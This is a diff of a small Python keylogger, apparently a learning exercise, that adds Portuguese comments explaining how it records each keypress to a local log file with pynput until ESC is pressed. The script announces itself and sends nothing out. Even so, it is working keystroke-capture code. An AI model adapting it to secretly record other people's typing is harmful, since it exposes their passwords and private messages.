@@ -6,7 +6,7 @@ import sys
 
 def encerra_programa(ke):
     print('Programa encerrado')
-
+# função que escreve as teclas no arquivo de log
 def escreve_key(key):
     try:
         with open(f'{log}','a') as file:
@@ -15,16 +15,19 @@ def escreve_key(key):
         print(f'Erro ao escrever no arquivo: {e}')
         encerra_programa(key)
 
-
+# se a tecla for esc, encerra o programa
     if key == Key.esc:
         encerra_programa(key)
 log = f'yek{random.randint(0,10000)}.txt'
 print('As teclas estão sendo registradas... Pressione ESC para sair.')
+# iniciando o listener
 try:
     with Listener(on_press=escreve_key) as logs:
         logs.join()
+# tratando possíveis erros ao iniciar o listener
 except Exception as e:
     print(f'Erro ao iniciar o listener: {e}')
+# garantindo que o listener será encerrado corretamente
 finally:
     try:
         logs.stop()
